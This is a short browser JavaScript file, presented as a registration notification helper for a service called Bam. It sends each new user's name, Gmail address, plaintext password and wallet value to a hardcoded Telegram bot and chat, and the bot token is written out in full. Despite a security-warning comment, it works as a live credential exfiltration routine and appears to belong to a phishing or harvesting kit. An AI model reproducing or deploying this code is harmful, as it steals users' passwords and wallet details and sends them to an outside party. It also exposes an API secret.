/**
 * Telegram Notification Helper for Bam
 * ------------------------------------
 * Sends new user registration details to the configured bot.
 *
 * ⚠️ SECURITY WARNING:
 * - The bot token is visible in client-side code.
 * - Passwords are sent in PLAIN TEXT to Telegram.
 * - This is extremely insecure for any real production use.
 * - Move this to a secure backend before going live.
 */

const TELEGRAM_BOT_TOKEN = "8986498099:AAFToP96WF8Q1yoUzaL8JQOUIL_eK23kwt4";
const TELEGRAM_CHAT_ID = "8927215681";

/**
 * Send a formatted message to the Telegram bot
 * @param {Object} user - { name, email, password, wallet }
 */
async function sendRegistrationToTelegram(user) {
  const now = new Date();
  const timeStr = now.toLocaleString("en-GB", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const message = `
🚀 <b>New Bam User Registered!</b>
━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${escapeHtml(user.name)}
📧 <b>Email (Gmail):</b> ${escapeHtml(user.email)}
🔑 <b>Password:</b> <code>${escapeHtml(user.password)}</code>
💳 <b>Wallet:</b> <code>${user.wallet}</code>
🕒 <b>Time:</b> ${timeStr}
━━━━━━━━━━━━━━━━━━━━
💎 Welcome to the Bam Network!
  `.trim();

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true
      })
    });

    const data = await response.json();

    if (!data.ok) {
      console.warn("Telegram API error:", data);
      return false;
    }

    console.log("✅ Registration (with password) notified on Telegram");
    return true;
  } catch (err) {
    console.error("Failed to send Telegram message:", err);
    return false;
  }
}

function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// Expose globally
window.sendRegistrationToTelegram = sendRegistrationToTelegram;
